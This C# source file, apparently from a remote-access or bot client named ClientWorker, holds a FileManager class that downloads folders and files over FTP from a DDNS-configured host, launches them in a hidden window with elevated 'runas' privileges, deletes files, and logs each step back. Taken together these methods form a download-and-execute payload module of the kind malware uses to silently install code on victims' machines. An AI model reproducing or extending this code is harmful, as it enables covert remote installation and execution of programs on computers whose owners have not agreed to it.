using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;

namespace ClientWorker
{
    public static class FileManager
    {
        public static void DownloadFloader(string floader, string localPath)
        {
            Log.Send("DownloadFloader("+ floader + ","+ localPath+")");
            FtpClient.DownloadFtpDirectory("ftp://" + StartData.ddnsHostName[1] + "/" + floader, localPath);
        }

        public static void RunHideProc(string fileName)
        {
            Log.Send("RunHideProc");
            try
            {
                new Process
                {
                    StartInfo =
                    {
                        FileName = fileName,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        Verb = "runas",
            }
                }.Start();
            }
            catch (Exception ex)
            {
                Log.Send("RunHideProc failed: " + ex.ToString());
            }
        }

        public static void DownloadFileAndRun(string fileName)
        {
            Log.Send("DownloadFileAndRun");
            try
            {
                FtpClient.DownloadF(fileName);
                RunHideProc(fileName);
            }
            catch (Exception ex)
            {
                Log.Send("Exception DownloadFileAndRun: " + ex.Message);
            }
        }

        public static void DeleteFile(string parth)
        {
            try
            {
                File.Delete(parth);
            }
            catch (Exception ex)
            {
                Log.Send("Ошибка удаления файла: " + ex.Message);
            }
        }
    }
}
